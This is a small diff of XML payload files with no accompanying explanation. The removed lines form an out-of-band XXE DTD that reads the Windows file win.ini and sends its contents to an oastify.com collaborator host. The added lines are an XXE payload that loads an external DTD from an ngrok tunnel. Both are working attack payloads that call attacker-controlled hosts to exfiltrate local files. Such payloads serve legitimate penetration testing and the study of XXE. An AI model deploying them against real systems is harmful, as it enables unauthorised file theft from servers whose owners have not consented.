@@ -1,4 +1,2 @@
-<!ENTITY % file SYSTEM "file:///c:/Windows/win.ini">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://c8l3vcdabuxf87aow31i3n2o8fe6203os.oastify.com/?x=%file;'>">
-%eval;
-%exfil;
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://ab3b-46-120-78-80.ngrok-free.app/test/xxe.dtd"> %xxe;]>
